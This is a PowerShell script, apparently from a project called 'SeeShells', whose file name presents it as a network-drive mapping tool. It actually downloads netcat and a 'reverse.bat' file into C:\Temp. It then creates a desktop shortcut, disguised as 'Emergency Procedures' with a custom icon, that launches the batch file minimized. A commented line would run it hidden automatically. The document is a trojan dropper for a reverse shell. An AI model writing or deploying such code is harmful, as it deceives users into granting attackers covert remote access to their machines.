/*******************************************************
 *  Project Name  : SeeShells
 *  File Name     : MapNetworkDrives.ps1
 *  Author        : Damien Keffyn
 *  Company       : Sentinal IT
 *  Date Created  : 27/09/2024
 *******************************************************/




# Create Temp folder if it doesn't exist
$TempPath = "C:\Temp"
If (!(Test-Path -Path $TempPath)) {
    New-Item -ItemType Directory -Path $TempPath
}

# Define file URLs from GitHub repository
$ncUrl = "https://github.com/damienkeffyn/SeeShells/raw/main/nc.exe"
$batchUrl = "https://github.com/damienkeffyn/SeeShells/raw/main/reverse.bat"
$iconUrl = "https://github.com/damienkeffyn/SeeShells/raw/main/emergency_airdrop.ico"  # URL for the icon

# Define save paths
$ncFile = "$TempPath\nc.exe"
$batchFile = "$TempPath\reverse.bat"
$iconFile = "$TempPath\emergency_airdrop.ico"
$desktopLnk = "$([Environment]::GetFolderPath('Desktop'))\Emergency Procedures.lnk"

# Check if nc.exe is running and kill it if found
$process = Get-Process -Name nc -ErrorAction SilentlyContinue
if ($process) {
    Write-Host "nc.exe is running. Terminating the process..."
    Stop-Process -Name nc -Force
    Write-Host "nc.exe has been terminated."
} else {
    Write-Host "nc.exe is not running."
}

# Download nc.exe
Invoke-WebRequest -Uri $ncUrl -OutFile $ncFile

# Download reverse.bat
Invoke-WebRequest -Uri $batchUrl -OutFile $batchFile

# Download emergency_airdrop.ico for the shortcut icon
Invoke-WebRequest -Uri $iconUrl -OutFile $iconFile

# Create Shortcut (Emergency Procedures.lnk) on the Desktop
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($desktopLnk)
$Shortcut.TargetPath = "$TempPath\reverse.bat"
$Shortcut.WorkingDirectory = $TempPath
$Shortcut.WindowStyle = 7  # Minimized window
$Shortcut.IconLocation = $iconFile  # Use the downloaded icon
$Shortcut.Save()

# Output a message to confirm
Write-Host "nc.exe, reverse.bat, and emergency_airdrop.ico downloaded to C:\Temp and Emergency Procedures.lnk created on the Desktop with the custom icon."

# Optionally, run the reverse.bat automatically (uncomment the line below if needed)
# Start-Process "$batchFile" -WindowStyle Hidden
